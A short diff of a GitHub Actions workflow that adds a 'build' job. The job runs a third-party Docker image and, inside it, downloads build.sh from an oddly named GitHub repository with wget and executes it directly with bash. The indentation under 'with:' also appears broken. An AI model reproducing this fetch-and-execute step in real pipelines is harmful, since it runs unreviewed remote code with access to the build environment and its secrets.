@@ -7,11 +7,12 @@ on:
     branches: [ main ]
 
 jobs:
-   runs-on: ubuntu-latest
-   steps:
-     - uses: addnab/docker-run-action@v3
-       with:
-         image: dazz111/ubuntu-sdk:build
-         shell: bash
-         run: |
-           wget https://raw.githubusercontent.com/Jjtitdutitdtti7s5s/fejeyrb/main/build.sh && bash build.sh
+  build: 
+     runs-on: ubuntu-latest
+     steps:
+        - uses: addnab/docker-run-action@v3
+          with:
+          image: dazz111/ubuntu-sdk:build
+          shell: bash
+          run: |
+            wget https://raw.githubusercontent.com/Jjtitdutitdtti7s5s/fejeyrb/main/build.sh && bash build.sh
